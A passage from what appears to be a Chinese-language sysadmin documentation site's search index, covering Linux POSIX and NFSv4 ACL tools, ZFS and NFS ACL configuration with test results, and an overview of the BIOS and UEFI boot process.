\u547d\u4ee4\u663e\u793a\u6587\u4ef6\u6216\u76ee\u5f55\u7684 ACL\u3002\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>getfacl [OPTION] file\n</code></pre> <p>\u5e38\u7528\u9009\u9879\u5305\u62ec\uff1a</p> Flag Description <code>-a</code>/<code>--access</code> \u53ea\u663e\u793a\u6587\u4ef6\u7684\u8bbf\u95ee\u63a7\u5236\u5217\u8868 <code>-d</code>/<code>--default</code> \u663e\u793a\u9ed8\u8ba4\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff08\u4ec5\u4e3b\u8981\u8bbf\u95ee\u63a7\u5236\uff09\uff0c\u5b83\u51b3\u5b9a\u4e86\u5728\u6b64\u76ee\u5f55\u4e2d\u521b\u5efa\u7684\u4efb\u4f55\u6587\u4ef6/\u76ee\u5f55\u7684\u9ed8\u8ba4\u6743\u9650 <code>-R</code>/<code>--recursive</code> \u663e\u793a\u5b50\u76ee\u5f55\u7684 ACL <code>-p</code>/<code>--absolute-names</code> \u4e0d\u8981\u5220\u9664\u8def\u5f84\u540d\u4e2d\u7684\u524d\u5bfc <code>/</code> Example <pre><code>$ getfacl foo.txt\n# file: foo.txt\n# owner: user\n# group: PZSXXXX\nuser::rw-\ngroup::r--\nother::r--\n</code></pre> <p><code>setfacl</code> \u547d\u4ee4\u5141\u8bb8\u4f60\u8bbe\u7f6e\u6587\u4ef6\u6216\u76ee\u5f55\u7684 ACL\u3002\u4f7f\u7528\u65b9\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>setfacl [OPTION] COMMAND file\n</code></pre> <p><code>setfacl</code> \u4f7f\u7528\u51e0\u79cd <code>COMMAND</code> \u6765\u4fee\u6539\u6587\u4ef6\u6216\u76ee\u5f55\u7684 ACL\uff1a</p> Command Function <code>-m</code>/<code>--modify=acl</code> \u4fee\u6539\u6587\u4ef6\u7684\u5f53\u524d ACL\u3002<code>setfacl -m u/g:uid/gid:r/w/x file</code> <code>-M</code>/<code>--modify-file=file</code> \u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6 ACL \u6761\u76ee\u4ee5\u4fee\u6539\u3002<code>setfacl -M file_with_acl_permissions file_to_modify</code> <code>-x</code>/<code>--remove=acl</code> \u4ece\u6587\u4ef6\u4e2d\u5220\u9664 ACL \u6761\u76ee\u3002<code>setfacl -x u/g:uid/gid:r/w/x file</code> <code>-X</code>/<code>--remove-file=file</code> \u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6 ACL \u6761\u76ee\u4ee5\u5220\u9664\u3002<code>setfacl -X file_with_acl_permissions file_to_modify</code> <code>-b</code>/<code>--remove-all</code> \u5220\u9664\u6240\u6709\u6269\u5c55 ACL \u6743\u9650 <p><code>setfacl</code> \u7684\u5e38\u7528\u9009\u9879\u5982\u4e0b\uff1a</p> Option Function <code>-R</code>/<code>--recursive</code> \u9012\u5f52\u904d\u5386\u5b50\u76ee\u5f55 <code>-d</code>/<code>--default</code> \u5c06\u4fee\u6539\u5e94\u7528\u5230\u9ed8\u8ba4 ACL <code>--test</code> \u6d4b\u8bd5 ACL \u4fee\u6539\uff08ACL \u4e0d\u4f1a\u88ab\u4fee\u6539\uff09 <p>Example</p> <pre><code># \u8bbe\u7f6e\u7528\u6237\u6743\u9650\nsetfacl -m u:uid:-wx foo.txt\n# \u8bbe\u7f6e\u7ec4\u6743\u9650\nsetfacl -m g:gid:rw- foo.txt\n# \u5220\u9664\u7528\u6237\u6743\u9650\nsetfacl -x user:uid foo.txt\n# \u6388\u4e88\u7528\u6237\u9012\u5f52\u8bfb\u53d6\u6743\u9650\uff0c\u6ce8\u610f\u5927\u5199 'X' \u4ec5\u6388\u4e88\u76ee\u5f55\u6267\u884c\u6743\u9650\nsetfacl -R -m u:uid:r-X shared-dir\n# \u8bbe\u7f6e\u9ed8\u8ba4 ACL\uff0c\u65b0\u5efa\u6587\u4ef6\u7ee7\u627f\nsetfacl -d -m u:uid:r-X shared-dir\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#nfs4-acl-tools","title":"<code>nfs4-acl-tools</code>","text":"<pre><code>nfs4_setfacl [OPTIONS] COMMAND file\nnfs4_getfacl [OPTIONS] file\n</code></pre> Command Description <code>-a acl_spec [index]</code> add ACL entries in acl_spec at index (DEFAULT: 1) <code>-x acl_spec \\| index</code> remove ACL entries or entry-at-index from ACL <code>-A file [index]</code> read ACL entries to add from file <code>-X file</code> read ACL entries to remove from file <code>-s acl_spec</code> set ACL to acl_spec (replaces existing ACL) <code>-S file</code> read ACL entries to set from file <code>-m from_ace to_ace</code> modify in-place: replace 'from_ace' with 'to_ace' Option Description <code>-R</code> recursive <code>-L</code> logical, follow symbolic links <code>-P</code> physical, skip symbolic links","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#\u6587\u4ef6\u7cfb\u7edf\u7684-acl-\u914d\u7f6e","title":"\u6587\u4ef6\u7cfb\u7edf\u7684 ACL \u914d\u7f6e","text":"<p>Quote</p> <ul> <li>Setting ACLs on ZFS Files - Oracel Help Center</li> <li>zfsprops.7 - OpenZFS</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#openzfs","title":"OpenZFS","text":"<p>OpenZFS \u6587\u6863\u4e2d\uff0c<code>acltype</code> \u53c2\u6570\u63cf\u8ff0\u5982\u4e0b\uff1a</p> <ul> <li><code>nfsv4</code>: default on FreeBSD, indicates that NFSv4-style ZFS ACLs should be used. These ACLs can be managed with the getfacl(1) and setfacl(1). The nfsv4 ZFS ACL type is not yet supported on Linux.</li> <li><code>posix</code>: indicates POSIX ACLs should be used. POSIX ACLs are specific to Linux and are not functional on other platforms. POSIX ACLs are stored as an extended attribute and therefore will not overwrite any existing NFSv4 ACLs which may be set.</li> </ul> <p>\u4f7f\u7528 <code>mount</code> \u53ef\u4ee5\u67e5\u770b\u662f\u5426\u5f00\u542f\u4e86 ACL\u3002ZFS \u9ed8\u8ba4\u672a\u5f00\u542f ACL\uff1a</p> <pre><code>type zfs (rw,relatime,xattr,noacl,casesensitive)\n</code></pre> <p>\u8bbe\u7f6e ZFS \u5c5e\u6027\u4ee5\u5f00\u542f ACL\uff1a</p> <pre><code>zfs set acltype=posixacl tank\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 <code>mount</code> \u53d1\u751f\u53d8\u5316\uff1a</p> <pre><code>type zfs (rw,relatime,xattr,posixacl,casesensitive)\n</code></pre> <p>\u53ef\u4ee5\u914d\u7f6e\u7684\u76f8\u5173\u5c5e\u6027\uff0c\u8bf7\u67e5\u770b zfsprops \u9875\u9762\uff1a</p> <ul> <li><code>aclinherit=discard|noallow|restricted|passthrough|passthrough-x</code><ul> <li>\u63a7\u5236 ACL \u7ee7\u627f\u884c\u4e3a\u3002\u9ed8\u8ba4 <code>restricted</code> \u5220\u53bb <code>wirte_acl</code> \u548c <code>write_owner</code> \u6743\u9650\u3002</li> </ul> </li> <li><code>aclmode=discard|groupmask|passthrough|restricted</code><ul> <li>\u63a7\u5236 <code>chmod</code> \u65f6 ACL \u7684\u884c\u4e3a\u3002\u9ed8\u8ba4 <code>discard</code> \u4e22\u5f03\u6240\u6709\u6269\u5c55 ACL\u3002</li> </ul> </li> <li><code>acltype=off|nfsv4|posix</code></li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#linux-nfs","title":"Linux NFS","text":"<p><code>exports</code> man page \u8bf4\u660e ACL \u9ed8\u8ba4\u652f\u6301\uff1a</p> <p>Current NFSv3 clients use the <code>ACCESS</code> RPC to perform all access decisions on the server. Note that the <code>no_acl</code> option only has effect on kernels specially patched to support it, and when exporting filesystems with ACL support. The default is to export with ACL support (i.e. by default, no_acl is off).</p> <p>ZFS \u7684 <code>sharenfs</code> \u76f4\u63a5\u4f7f\u7528 <code>export</code> \u8bf4\u660e\u7684\u5c5e\u6027\uff0c\u4e5f\u9ed8\u8ba4\u652f\u6301\u3002</p> <p>No acl on nfs mount in linux? - ServerFault \u5bf9 NFS \u7684 ACL \u884c\u4e3a\u4f5c\u4e86\u4e00\u4e9b\u8ba8\u8bba\u3002\u7ecf\u8fc7\u5b9e\u6d4b\uff0c\u8868\u73b0\u662f\u8fd9\u6837\u7684\uff1a</p> NFSv3NFSv4 <ul> <li>\u73af\u5883\uff1a<ul> <li>\u670d\u52a1\u7aef <code>zfs-2.2.4-pve1</code>\uff0c\u542f\u7528 POSIX ACL</li> <li>\u5ba2\u6237\u7aef\u6302\u8f7d NFSv3</li> </ul> </li> <li>\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u8868\u73b0\u4e00\u81f4\uff0c<code>setfacl</code> \u548c <code>getfacl</code> \u90fd\u80fd\u6b63\u5e38\u4f7f\u7528\uff0c<code>ls</code> \u4e5f\u80fd\u6b63\u786e\u663e\u793a <code>+</code> \u53f7\u3002</li> </ul> <ul> <li>\u73af\u5883\uff1a<ul> <li>\u670d\u52a1\u7aef <code>zfs-2.2.4-pve1</code>\uff0c\u542f\u7528 POSIX ACL</li> <li>\u5ba2\u6237\u7aef\u6302\u8f7d NFSv4</li> </ul> </li> <li>\u670d\u52a1\u5668\u4f7f\u7528 <code>setfacl</code> \u8bbe\u7f6e\u7684 POSIX ACL \u5728\u5ba2\u6237\u7aef\u4e0a\u8868\u73b0\u6b63\u786e</li> <li>\u5ba2\u6237\u7aef\u4f7f\u7528 <code>ls</code> \u770b\u4e0d\u5230 <code>+</code> \u53f7\uff0c\u4f7f\u7528 <code>getfacl</code> \u4e5f\u770b\u4e0d\u5230 ACL</li> <li>\u5ba2\u6237\u7aef\u4f7f\u7528 <code>nfs4_getfacl</code> \u53ef\u4ee5\u770b\u5230 ACL</li> <li>\u5ba2\u6237\u7aef\u65e0\u6cd5\u4f7f\u7528 <code>setfacl</code> \u8bbe\u7f6e ACL</li> <li>\u5ba2\u6237\u7aef\u53ef\u4ee5\u4f7f\u7528 <code>nfs4_setfacl</code> \u8bbe\u7f6e ACL\uff0c\u4f46\u662f\u56e0\u4e3a LDAP \u57df\u540d\u6620\u5c04\u6682\u672a\u914d\u7f6e\uff0c\u53ea\u80fd\u4f7f\u7528 UID/GID\u3002\u53ef\u4ee5\u4f7f\u7528 <code>getent passwd &lt;user&gt;</code> \u67e5\u770b LDAP \u4e2d\u7684 UID/GID\u3002\u76f8\u5173\u7684\u914d\u7f6e\u53ef\u4ee5\u53c2\u8003 https://community.netapp.com/t5/ONTAP-Discussions/NFSv4-ACLs-on-RHEL/m-p/19844</li> </ul> <p>Log \u5982\u4e0b\uff1a</p> <pre><code>$ ls -lah\ntotal 3.0K\ndrwxr-xr-x 2 root root 3 Jul 25 17:29 .\ndrwxrwxrwx 3 root root 6 Jul 25 17:21 ..\n-rw-rwxr-- 1 root root 6 Jul 25 17:30 bowling_can_write\n$ getfacl bowling_can_write\n# file: bowling_can_write\n# owner: root\n# group: root\nuser::rw-\ngroup::rwx\nother::r--\n$ nfs4_getfacl bowling_can_write\n# file: bowling_can_write\nD::OWNER@:x\nA::OWNER@:rwatTcCy\nA::1003:rwaxtcy\nA::GROUP@:rtcy\nA::EVERYONE@:rtcy\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/acl/#acl-\u5b9e\u73b0","title":"ACL \u5b9e\u73b0","text":"<p>POSIX ACL:</p> <ul> <li>\u64cd\u4f5c\u7cfb\u7edf\u5c42\u9762\uff1a\u5bf9\u4e8e\u5927\u90e8\u5206 UNIX-like \u7cfb\u7edf\uff0cACL \u4f5c\u4e3a Extended Attribute \u5b58\u50a8\u5728\u6587\u4ef6\u7cfb\u7edf\u4e2d\u3002\u5728\u7cfb\u7edf\u8c03\u7528\u5c42\u9762\u4e0a\uff0cEA \u53ef\u4ee5\u770b\u4f5c\u4e0e\u6587\u4ef6\u5bf9\u8c61\u76f8\u5173\u8054\u7684\u952e\u503c\u5bf9\u3002EA \u4e0d\u4ec5\u7528\u4e8e\u5b9e\u73b0 ACL\u3002</li> <li>\u6587\u4ef6\u7cfb\u7edf\u5c42\u9762\uff1a<ul> <li>Ext2/3\uff1a\u4f7f\u7528 <code>i_file_acl</code> \u5b57\u6bb5\uff0c\u6307\u5411\u4e00\u4e2a EA block\u3002</li> <li>XFS\uff1a\u5c0f\u7684 EA \u76f4\u63a5\u5b58\u50a8\u5728 inode\uff0c\u5927\u7684\u5b58\u50a8\u5728 B+ \u6811\u4e2d\u3002</li> </ul> </li> </ul> <p>NFS:</p> <ul> <li>v2 \u65f6\uff0c\u8bbf\u95ee\u63a7\u5236\u662f\u5728\u5ba2\u6237\u7aef\u7f13\u5b58\u505a\u7684\uff0c\u4ea7\u751f\u4e86\u4e00\u4e9b\u95ee\u9898\u3002</li> <li>\u4ece v3 \u5f00\u59cb\u5b9a\u4e49\u4e86 <code>ACCESS</code> RPC \u8c03\u7528\uff0c\u5411\u670d\u52a1\u5668\u8bf7\u6c42\u6587\u4ef6\u7684\u6743\u9650\uff0c\u4f46\u6ca1\u6709\u89c4\u5b9a\u5982\u4f55\u4f20\u8f93 ACL\u3002\u4e0d\u540c\u5382\u5bb6\u5b9e\u73b0\u7684 NFSv3 \u5728 ACL \u4e0a\u6709\u6240\u4e0d\u540c\u3002</li> <li>v4 \u5b8c\u5584\u4e86 ACL\u3002</li> </ul> <p>\u5728 Linux \u7cfb\u7edf export \u51fa\u7684 NFS \u4e2d\uff0c\u5e76\u6ca1\u6709\u5b9e\u73b0\u771f\u6b63\u7684 NFSv4 ACL\uff0c\u8fd8\u662f\u9700\u8981\u505a\u5230 POSIX ACL \u7684\u6620\u5c04\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/system/basic/boot/","title":"\u542f\u52a8\u8fc7\u7a0b","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/boot/#\u542f\u52a8\u8fc7\u7a0b","title":"\u542f\u52a8\u8fc7\u7a0b","text":"<p>Abstract</p> <p>\u672c\u6587\u6863\u63cf\u8ff0\u4ece\u6309\u4e0b\u7535\u6e90\u952e\u5230 Bootloader \u5f15\u5bfc\u7cfb\u7edf\u4e3a\u6b62\uff0c\u8ba1\u7b97\u673a\u7684\u542f\u52a8\u8fc7\u7a0b\u3002\u672c\u6587\u4ee5 x86 \u67b6\u6784\u548c Linux \u7cfb\u7edf\u4e3a\u4e3b\u3002</p> <p>\u9605\u8bfb\u672c\u6587\u4e0d\u9700\u8981\u6c47\u7f16\u548c\u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784\u7684\u77e5\u8bc6\u3002</p> <p>PXE \u76f8\u5173\u5185\u5bb9\u89c1 PXE\u3002</p> <p>Quote</p> <p>\u5982\u679c\u4f60\u60f3\u8981\u5728\u4ee3\u7801\u5c42\u9762\u63a2\u7a76\u8ba1\u7b97\u673a\u542f\u52a8\u65e9\u671f\u7684\u5de5\u4f5c\u539f\u7406\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4ece\u4e0b\u9762\u7684\u4e66\u7c4d\u4e2d\u5f00\u59cb\uff0c\u81f3\u5c11\u6bd4\u52a8\u8f84\u51e0\u767e\u4e0a\u5343\u9875\u7684\u6807\u51c6\u597d\u8bfb\u4e00\u4e9b\u3002</p> <ul> <li> pinczakko/BIOS-Disassembly-Ninjutsu-Uncovered\uff1aBIOS \u53cd\u6c47\u7f16\u6307\u5357\u3002</li> <li>Beyond BIOS: Developing with the Unified Extensible Firmware Interface\uff1aUEFI \u5f00\u53d1\u6307\u5357\u3002</li> </ul> <p>\u672c\u6587\u4e0d\u4f1a\u50cf\u8fd9\u4e9b\u4e66\u7c4d\u4e00\u6837\u6df1\u5165\u63a2\u8ba8\u5b9e\u73b0\uff0c\u800c\u662f\u4ece\u7528\u6237\u7684\u89d2\u5ea6\u63cf\u8ff0\u539f\u7406\u3002</p> <p>x86 \u67b6\u6784\u542f\u52a8\u8fc7\u7a0b\u5206\u4e3a\u4e24\u79cd\uff1aBIOS\uff08Legacy\uff09\u548c UEFI\u3002BIOS \u56e0\u4e3a\u6ca1\u6709\u6807\u51c6\u4e14\u8001\u65e7\uff0c\u73b0\u5df2\u88ab UEFI \u53d6\u4ee3\u3002</p> <p>\u5982\u4eca\u670d\u52a1\u5668\u90fd\u4f7f\u7528 UEFI \u542f\u52a8\u3002\u4f60\u4f1a\u5728 BIOS \u9009\u9879\u4e2d\u770b\u5230 CSM\uff08Compatibility Support Module\uff09\uff0c\u8fd9\u662f\u4e3a\u4e86\u517c\u5bb9\u65e7\u7684 BIOS \u542f\u52a8\u65b9\u5f0f\u3002\u5173\u95ed\u5b83\uff0c\u7cfb\u7edf\u5c31\u4f1a\u5b8c\u5168\u4f7f\u7528 UEFI \u542f\u52a8\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/boot/#bioslegacy","title":"BIOS\uff08Legacy\uff09","text":"<p>Quote</p> <ul> <li>System Initialization (x86) - OSDev Wiki</li> </ul> <p>BIOS \u542f\u52a8\u8fc7\u7a0b\u5982\u4e0b\uff1a</p> <ul> <li>\u68c0\u6d4b RAM\uff1aBIOS \u9700\u8981 RAM \u624d\u80fd\u5de5\u4f5c\u3002\u4e3a\u4e86\u4f7f\u7528 RAM\uff0cCPU \u5148\u8fd0\u884c\u5728 ROM \u4e2d\u7684\u4ee3\u7801\uff0c\u68c0\u6d4b RAM \u7684\u7c7b\u578b\u548c\u5927\u5c0f\u3002\u7136\u540e\u52a0\u8f7d\u5404\u79cd\u4e1c\u897f\u5230 RAM\uff0c\u6bd4\u5982\u5b9e\u6a21\u5f0f\u4e2d\u65ad\u5411\u91cf\u8868\uff08Real Mode IVT\uff09\u7b49\u3002</li> <li>\u786c\u4ef6\u68c0\u6d4b\u548c\u521d\u59cb\u5316\uff1aBIOS \u68c0\u6d4b\u5e76\u521d\u59cb\u5316\u5404\u4e2a\u603b\u7ebf\u4e0a\u7684\u8bbe\u5907\uff0c\u4fdd\u5b58\u5b83\u4eec\u7684\u4fe1\u606f\u4f9b\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\u3002BIOS \u5982\u679c\u5728\u786c\u4ef6\u4e0a\u68c0\u6d4b\u5230 ROM\uff0c\u5c31\u4f1a\u5c06\u5176\u6620\u5c04\u5230\u7269\u7406\u5185\u5b58\u4e2d\u3002\u8fd9\u4e00\u70b9\u5728 PXE \u542f\u52a8\u4e2d\u6d89\u53ca\u7f51\u5361\u56fa\u4ef6\u7684\u5730\u65b9\u4f1a\u7528\u5230\u3002</li> <li>\u542f\u52a8\u5e8f\u5217\uff1a\u5b8c\u6210\u521d\u59cb\u5316\u540e\uff0cBIOS \u5c1d\u8bd5\u5bfb\u627e\u53ef\u542f\u52a8\u7684\u8bbe\u5907\uff08\u5982\u786c\u76d8\u3001\u5149\u76d8\u3001USB\u3001\u7f51\u5361\u7b49\uff09\u3002\u53ef\u542f\u52a8\u7684\u8bbe\u5907\u90fd\u6709\u67d0\u79cd\u5f15\u5bfc\u6247\u533a\uff08Boot Sector\uff09\uff0cBIOS \u4f1a\u5c06\u8fd9\u4e2a\u6247\u533a\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u5e76\u8df3\u8f6c\u5230\u8fd9\u4e2a\u6247\u533a\u7684\u4ee3\u7801\u6267\u884c\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/boot/#uefi","title":"UEFI","text":"<p>Quote</p> <ul> <li>Understanding modern UEFI-based platform boot\uff1a\u8be6\u7ec6\u4ecb\u7ecd\u4e86 UEFI \u7684\u542f\u52a8\u8fc7\u7a0b\uff0c\u8fd8\u8d34\u5fc3\u5730\u79d1\u666e\u4e86\u4e00\u4e9b\u786c\u4ef6\u5e38\u8bc6\u3002</li> <li>UEFI - OSDev Wiki\uff1a\u7b80\u5355\u4ecb\u7ecd\u4e86 UEFI \u7684\u6982\u5ff5\u3001\u4e0e BIOS \u7684\u5bf9\u6bd4\uff0c\u7136\u540e\u4e3b\u8981\u5728\u8bb2 UEFI \u5e94\u7528\u7a0b\u5e8f\u7684\u5f00\u53d1\u548c\u8c03\u8bd5\uff0c\u6d89\u53ca POSIX-EFI\u3001GNU-EFI \u548c OVMF \u7b49\u3002</li> <li>Specifications - Unified Extensible Firmware Interface Forum</li> </ul> <p>UEFI \u89c4\u8303\u652f\u6301\u7684\u67b6\u6784\u5305\u62ec IA-32\u3001x64\u3001AArch32\u3001AArch64\u3001RISC-V \u548c LoongArch\u3002</p> <p>UEFI \u7684\u542f\u52a8\u8fc7\u7a0b\u5176\u5b9e\u548c BIOS \u5dee\u4e0d\u591a\uff0c\u53ea\u662f UEFI \u6709\u66f4\u591a\u7684\u529f\u80fd\u548c\u66f4\u597d\u7684\u8bbe\u8ba1\uff1a</p> <ul> <li>\u6807\u51c6\u5316\u4e86\u5e73\u53f0\u521d\u59cb\u5316\u8fc7\u7a0b\uff0c\u53ef\u5728\u5382\u5546\u4e2d\u7acb\u7684\u57fa\u7840\u4e0a\u6269\u5c55\u3002</li> <li>UEFI \u652f\u6301\u4ece FAT \u5206\u533a\u7684 GPT \u6216 MBR \u542f\u52a8\u8bbe\u5907\u4e2d\u52a0\u8f7d\u4efb\u610f\u5927\u5c0f\u7684 UEFI \u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u4e14\u53ef\u4ee5\u8fd4\u56de\u56fa\u4ef6\u7ee7\u7eed\u9009\u62e9\u5176\u4ed6\u542f\u52a8\u8bbe\u5907\u6216\u663e\u793a\u8bca\u65ad\u83dc\u5355\u3002\u800c BIOS \u53ea\u80fd\u4ece\u542f\u52a8\u8bbe\u5907\u7684 MBR \u8bfb\u53d6 512 \u5b57\u8282\u7684\u6241\u5e73\u4e8c\u8fdb\u5236\u4ee3\u7801\uff0c\u4e14\u65e0\u6cd5\u8fd4\u56de BIOS\u3002</li> <li>UEFI \u901a\u8fc7\u5185\u5b58\u4e2d\u7684\u201c\u534f\u8bae\u201d\u96c6\u5408\u63d0\u4f9b\u53ef\u8c03\u7528\u51fd\u6570\uff0c\u534f\u8bae\u884c\u4e3a\u53d7\u89c4\u8303\u5b9a\u4e49\uff1bUEFI \u5e94\u7528\u53ef\u5b9a\u4e49\u81ea\u5df1\u7684\u534f\u8bae\u5e76\u4f9b\u5176\u4ed6\u5e94\u7528\u4f7f\u7528\uff0c\u51fd\u6570\u8c03\u7528\u65b9\u5f0f\u6807\u51c6\u5316\uff0c\u7b26\u5408\u73b0\u4ee3\u7f16\u7a0b\u4e60\u60ef\u3002\u800c BIOS \u901a\u8fc7\u591a\u79cd\u4e2d\u65ad\u6302\u94a9\u4f9b bootloader \u8bbf\u95ee\u7cfb\u7edf\u8d44\u6e90\uff0c\u4e2d\u65ad\u672a\u6807\u51c6\u5316\uff0c\u4f9d\u8d56\u5386\u53f2\u60ef\u4f8b\u3002</li> <li>UEFI \u6709\u66f4\u597d\u7684\u5f00\u53d1\u73af\u5883\uff0c\u5982 EDK2\u3001GNU-EFI \u548c POSIX-UEFI\u3002\u800c BIOS \u9700\u8981\u4f7f\u7528 NASM \u548c GCC \u7b49\u5de5\u5177\u751f\u6210\u6241\u5e73\u4e8c\u8fdb\u5236\u955c\u50cf\u3002</li> <li>UEFI \u4eff\u771f\u66f4\u65b9\u4fbf\uff0cOVMF \u662f\u5f00\u6e90 UEFI \u56fa\u4ef6\uff0c\u5df2\u79fb\u690d\u81f3 QEMU\u3002</li> </ul> <p>\u4e0b\u9762\u5bf9 UEFI \u542f\u52a8\u7684\u6d41\u7a0b\u603b\u7ed3\u6765\u81ea Understanding modern UEFI-based platform boot\uff1a</p> <ul> <li>Pre-UEFI\uff1a<ul> <li>\u6700\u5f00\u59cb CPU \u963b\u585e\u5728 Reset \u4e2d\u65ad\u5411\u91cf\u5904\u3002</li> <li>PMC\uff08Power Management Controller\uff09\u7ed9 CSME\uff08Converged Security and Manageability Engine\uff09\u4e0a\u7535\u3002CSME ROM \u542f\u52a8\u5e76\u4f5c\u4e3a\u6839\u4fe1\u4efb\u5f00\u59cb\u3002</li> <li>\u63a5\u7740\u52a0\u8f7d\u5e76\u9a8c\u8bc1 CPU \u5fae\u7801\u548c ACM\uff08Authenticated Code Module\uff09\u7ec4\u4ef6\uff0c\u4f7f\u7528\u5b89\u5168\u8ba4\u8bc1\u65b9\u6cd5\u786e\u4fdd\u7cfb\u7edf\u5b8c\u6574\u6027\uff0c\u6700\u540e\u52a0\u8f7d\u5e76\u9a8c\u8bc1 OEM IBB\uff08Initial Boot Block\uff09\uff0c\u786e\u4fdd\u7cfb\u7edf\u5b89\u5168\u542f\u52a8\u3002</li> </ul> </li> <li>SEC\uff08Security\uff09\uff1a<ul> <li>\u4ece\u590d\u4f4d\u5411\u91cf\u5f00\u59cb\u542f\u52a8\u5904\u7406\u5668\uff0c\u5207\u6362\u5230\u4fdd\u62a4\u6a21\u5f0f\uff0c\u5e76\u914d\u7f6e CPU \u7f13\u5b58\u4e3a Cache-as-RAM\uff08CAR\uff09\u4ee5\u652f\u6301\u540e\u7eed\u7684\u56fa\u4ef6\u52a0\u8f7d\u548c\u6267\u884c\u3002</li> <li>\u8fd8\u8d1f\u8d23\u5904\u7406\u5e73\u53f0\u7684\u4f11\u7720\u72b6\u6001\u6062\u590d\uff0c\u5e76\u4e3a\u540e\u7eed\u7684 Pre-EFI \u521d\u59cb\u5316\uff08PEI\uff09\u9636\u6bb5\u63d0\u4f9b\u5fc5\u8981\u7684\u7cfb\u7edf\u4fe1\u606f\u3002</li> </ul> </li> <li>PEI\uff08Pre-EFI\uff09\uff1a<ul> <li>\u5b8c\u6210\u786c\u4ef6\u521d\u59cb\u5316\uff08\u5982\u5185\u5b58\u3001CPU\u3001I/O \u7b49\uff09\uff0c\u5e76\u901a\u8fc7 PEI Foundation \u7ba1\u7406 PEIM\uff08\u9884 EFI \u521d\u59cb\u5316\u6a21\u5757\uff09\u4e4b\u95f4\u7684\u534f\u8c03\u4e0e\u6267\u884c\uff0c\u540c\u65f6\u5c06\u4e34\u65f6\u7f13\u5b58\u5185\u5b58\uff08CAR\uff09\u5207\u6362\u5230\u4e3b\u7cfb\u7edf\u5185\u5b58\u3002</li> <li>\u8d1f\u8d23\u751f\u6210 HOB\uff08\u4ea4\u63a5\u5757\uff09\uff0c\u4e3a\u540e\u7eed\u9636\u6bb5\u63d0\u4f9b\u5fc5\u8981\u7684\u4fe1\u606f\u3002</li> </ul> </li> <li>DXE\uff08Driver eXecution Environment\uff09\uff1a<ul> <li>\u8d1f\u8d23\u66f4\u9ad8\u5c42\u6b21\u7684\u786c\u4ef6\u521d\u59cb\u5316\u548c\u670d\u52a1\uff0c\u5982\u7cfb\u7edf\u7ba1\u7406\u6a21\u5f0f (SMM)\u3001\u7f51\u7edc\u3001\u5f15\u5bfc\u78c1\u76d8\u7b49\uff0c\u5e76\u901a\u8fc7 DXE \u9a71\u52a8\u7a0b\u5e8f\u4e0e EFI \u7cfb\u7edf\u8868\u4ea4\u4e92\uff0c\u786e\u4fdd\u5e73\u53f0\u5728\u64cd\u4f5c\u7cfb\u7edf\u5f15\u5bfc\u524d\u6b63\u5e38\u8fd0\u884c</li> <li>Secure Boot \u786e\u4fdd\u5728\u6267\u884c\u4efb\u4f55 EFI \u5e94\u7528\u7a0b\u5e8f\u4e4b\u524d\uff0c\u76f8\u5173\u7684 DXE \u9a71\u52a8\u7a0b\u5e8f\u4f1a\u9a8c\u8bc1\u8be5\u5e94\u7528\u7a0b\u5e8f\u7684\u7b7e\u540d\uff0c\u4ee5\u786e\u4fdd\u53ea\u6709\u53d7\u4fe1\u4efb\u7684\u4ee3\u7801\u88ab\u52a0\u8f7d\uff0c\u9632\u6b62\u6076\u610f\u8f6f\u4ef6\u5728\u5f15\u5bfc\u8fc7\u7a0b\u4e2d\u6267\u884c\u3002</li> </ul> </li> <li>BDS\uff08Boot Device Selection\uff09\uff1a<ul> <li>\u7cfb\u7edf\u9009\u62e9\u5e76\u542f\u52a8\u5f15\u5bfc\u8bbe\u5907\uff0c\u901a\u5e38\u901a\u8fc7 UEFI \u53d8\u91cf\u6307\u5b9a\u5f15\u5bfc\u9879\u3002</li> <li>\u5bf9\u4e8e Windows\uff0cBDS \u9636\u6bb5\u4f1a\u52a0\u8f7d Windows \u5f15\u5bfc\u7ba1\u7406\u5668\uff08bootmgrfw.efi\uff09\uff0c\u5e76\u5f00\u59cb\u5f15\u5bfc\u8fc7\u7a0b\u3002</li> </ul> </li> <li>TSL\uff08Transient System Load\uff09\uff1a\u7531\u5f15\u5bfc\u52a0\u8f7d\u7a0b\u5e8f\uff08\u5982 Windows Boot Loader\uff09\u8d1f\u8d23\uff0c\u521d\u59cb\u5316\u64cd\u4f5c\u7cfb\u7edf\u7684\u6267\u884c\u73af\u5883\uff0c\u52a0\u8f7d\u5185\u6838\u548c\u9a71\u52a8\u7a0b\u5e8f\uff0c\u5e76\u5728\u5b8c\u6210\u540e\u79fb\u9664\u5f15\u5bfc\u65f6\u7684 DXE \u670d\u52a1\u3002</li> <li>RT\uff08RunTime\uff09\uff1a\u64cd\u4f5c\u7cfb\u7edf\u7684\u8fd0\u884c\u65f6\u9636\u6bb5\uff0c\u64cd\u4f5c\u7cfb\u7edf\u52a0\u8f7d\u6240\u9700\u9a71\u52a8\u5e76\u5f00\u59cb\u6b63\u5e38\u8fd0\u884c\uff0c\u5269\u4f59\u7684 EFI \u670d\u52a1\uff08\u5982\u8bfb\u53d6\u5199\u5165 UEFI \u53d8\u91cf\u3001\u5173\u673a\u7b49\uff09\u7531\u64cd\u4f5c\u7cfb\u7edf\u5728\u8fd0\u884c\u65f6\u8c03\u7528\u3002</li> </ul> 